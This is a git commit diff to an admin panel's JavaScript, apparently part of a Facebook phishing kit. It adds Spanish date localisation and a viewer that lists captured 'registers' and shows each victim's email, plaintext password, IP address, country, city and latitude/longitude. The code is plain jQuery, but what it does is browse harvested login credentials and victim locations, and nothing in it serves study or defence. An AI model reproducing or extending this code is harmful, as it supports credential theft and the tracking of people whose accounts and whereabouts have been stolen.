efe9b032c7bdbaa891ea60caaea294270947d9c2
Carlos Manuel Gamboa Palomino <gamboapalominocarlosmanuel@gmail.com>
2021-09-12 19:46:24 -0500

    NTS

--- admin/js/app.js
+++ admin/js/app.js
@@ -1,33 +1,62 @@
+moment.updateLocale('en', {
+    relativeTime: {
+        future: "en %s",
+        past: "hace %s",
+        s: 'algunos segundos',
+        ss: '%d segundos',
+        m: "un minuto",
+        mm: "%d minutos",
+        h: "una hora",
+        hh: "%d horas",
+        d: "un dia",
+        dd: "%d dias",
+        w: "una semana",
+        ww: "%d semanas",
+        M: "un mes",
+        MM: "%d meses",
+        y: "un año",
+        yy: "%d años"
+    }
+});
+moment.lang('es', {
+    months: 'Enero_Febrero_Marzo_Abril_Mayo_Junio_Julio_Agosto_Septiembre_Octubre_Noviembre_Diciembre'.split('_'),
+    monthsShort: 'Ene._Feb._Mar._Abr._May._Jun._Jul._Ago._Sept._Oct._Nov._Dec.'.split('_'),
+    monthsMin: 'Ene_Feb_Mar_Abr_May_Jun_Jul_Ago_Sept_Oct_Nov_Dec'.split('_'),
+    weekdays: 'Domingo_Lunes_Martes_Miercoles_Jueves_Viernes_Sabado'.split('_'),
+    weekdaysShort: 'Dom._Lun._Mar._Mier._Jue._Vier._Sab.'.split('_'),
+    weekdaysMin: 'Do_Lu_Ma_Mi_Ju_Vi_Sa'.split('_')
+});
+
 function listRegisters() {
-    $('#files').empty();
-    $('#content').html(`
-        <tr>
-            <td colspan="4">--- Muestre resultados aquí ---</td>
-        </tr>
-    `);
-    $.ajax({
-        url: 'http://localhost/facebook/admin/php/funcs.php',
-        type: 'POST',
-        data: {
-            'function': 'findRegisters'
-        }
-    }).done(res => {
-        if (res.status == 200) {
-            res.data.forEach(file => {
-                template = `
-                <div onclick="selectFile(this)"
-                ondblclick="dataByRegister(this)">
-                    <div class="img"></div>
-                    ${file}
-                </div>
-                `;
-                $('#files').append(template);
-            });
-        }
-    })
+    $('#content').hide(250);
+    if ($('#files').hasClass('users')) {
+        dataByRegister($('#files').attr('data-id'));
+    } else {
+        $('#files').empty();
+        $.ajax({
+            url: 'http://localhost/facebook/admin/php/funcs.php',
+            type: 'POST',
+            data: {
+                'function': 'findRegisters'
+            }
+        }).done(res => {
+            if (res.status == 200) {
+                res.data.forEach(file => {
+                    template = `
+                            <div onclick="selectFile(this)"
+                            ondblclick="dataByRegister($(this).text().trim())">
+                                <div class="img"></div>
+                                ${file}
+                            </div>
+                            `;
+                    $('#files').append(template);
+                });
+            }
+        })
+    }
 }
 
-function selectFile(file){
+function selectFile(file) {
     if ($(file).hasClass('selected')) {
         $(file).removeClass('selected');
     } else {
@@ -39,7 +68,13 @@ function selectFile(file){
 function dataByRegister(file) {
     $('#files > div').removeClass('selected');
     $(file).addClass('selected');
-    var fileName = $(file).text().trim();
+    var fileName = file;
+    $('#files').empty().addClass('users').attr('data-id', fileName).html(`
+                <div id="back" title="Volver">
+                    <div class="img"></div>
+                    Volver
+                </div>
+            `);
     $.ajax({
         url: 'http://localhost/facebook/admin/php/funcs.php',
         type: 'POST',
@@ -48,28 +83,45 @@ function dataByRegister(file) {
             'data': fileName
         }
     }).done(res => {
-        if(res.status == 200) {
-            $('#content').empty();
+        if (res.status == 200) {
             res.data.forEach(user => {
                 var id = user.id;
                 var email = user.username.email;
                 var time = moment(user.date).fromNow();
-                var ip = user.client.ip;
                 template = `
-                <tr>
-                    <td>${id}</td>
-                    <td>${email}</td>
-                    <td>${time}</td>
-                    <td>
-                        <button>👁</button>
-                        <button>X</button>
-                    </td>
-                </tr>
+                <div onclick="selectFile(this)"
+                title="${email}
+[${time}]" data-user='${JSON.stringify(user)}'
+                ondblclick="showDataByUser(this)">
+                    <div class="img"></div>
+                    ${id}
+                </div>
                 `;
-                $('#content').append(template);
+                $('#files').append(template);
             })
         }
     })
 }
 
+function showDataByUser(user) {
+    $(user).addClass('selected');
+    var dataUser = $(user).data('user');
+    $('#id').text(dataUser.id);
+    $('#email').text(dataUser.username.email);
+    $('#pass').text(dataUser.username.pass);
+    $('#date').text(moment(dataUser.date).format('Do/MM/YY h:mm:ss a'));
+    $('#ip').text(dataUser.client.ip);
+    $('#continent').text(dataUser.client.continent);
+    $('#country').text(dataUser.client.country);
+    $('#region').text(dataUser.client.province);
+    $('#city').text(dataUser.client.district);
+    $('#latitude').text(dataUser.client.geolocation.latitude);
+    $('#longitude').text(dataUser.client.geolocation.longitude);
+    $('#content').show(250);
+}
+
 listRegisters();
+$(document).on('click', '#back', function () {
+    $('#files').removeClass('users');
+    listRegisters();
+})
